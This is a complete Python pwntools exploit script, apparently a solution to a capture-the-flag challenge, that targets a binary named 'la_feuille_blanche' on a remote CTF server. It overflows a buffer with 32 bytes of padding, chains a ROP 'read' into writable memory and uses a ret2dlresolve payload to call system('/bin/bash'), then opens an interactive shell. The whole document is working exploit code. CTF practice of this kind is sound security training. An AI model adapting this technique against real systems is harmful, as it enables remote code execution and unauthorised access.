from pwn import *

elf = context.binary = ELF('../data/la_feuille_blanche', checksec=False)
# p = elf.process()

ret = 0x080482b2

p = remote('challenges.404ctf.fr', 31822)
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/bash'])

rop.raw('A' * 32)
rop.raw(ret)
# read to where we want to write the fake structures
rop.read(0, dlresolve.data_addr)
# call .plt and dl-resolve() with the correct, calculated reloc_offset
rop.ret2dlresolve(dlresolve)

# log.info(rop.dump())

# print(rop.chain)

print(dlresolve.payload)

p.sendline(rop.chain())
sleep(0.1)

# now the read is called and we pass all the relevant structures in
p.sendline(dlresolve.payload)

p.interactive()
